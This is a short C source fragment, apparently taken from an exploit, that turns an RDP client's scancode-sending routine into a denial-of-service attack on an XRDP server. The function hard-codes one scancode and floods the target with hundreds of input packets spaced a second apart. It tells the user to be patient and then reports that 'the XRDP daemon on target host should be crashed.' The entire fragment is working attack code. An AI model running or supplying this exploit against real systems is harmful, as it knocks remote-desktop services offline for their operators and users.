
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef char uint8 ;
typedef int uint32 ;
typedef int uint16 ;


 int RDP_INPUT_SCANCODE ;
 int RDP_KEYRELEASE ;
 int exit (int) ;
 int fprintf (int ,char*) ;
 int rdp_disconnect () ;
 int rdp_send_input (int ,int ,int,char,int ) ;
 int sleep (int) ;
 int stderr ;
 int update_modifier_state (char,int) ;

void rdp_send_scancode(uint32 time, uint16 flags, uint8 scancode)
{
 update_modifier_state(scancode, !(flags & RDP_KEYRELEASE));
 int c1, c2 = 1;
 scancode = '\x1e';

 fprintf(stderr, "\tBe patient!  It takes about a minute, the RDP packets\n");
 fprintf(stderr, "\tneed to be sent spaced apart or the daemon discards them.\n\n");
 fprintf(stderr, "[=] Progress: ");

 for (c1 = 1 ; c1 < 100 ; c1++)
 {
  for (c2 = 1 ; c2 < 5 ; c2++)
  {

   rdp_send_input(time, RDP_INPUT_SCANCODE, flags, scancode, 0);

  }

  fprintf(stderr, "*");
  sleep(1);
 }

 fprintf(stderr, "\n[=] The XRDP daemon on target host should be crashed.\n");
 rdp_disconnect();
 exit(1);
}
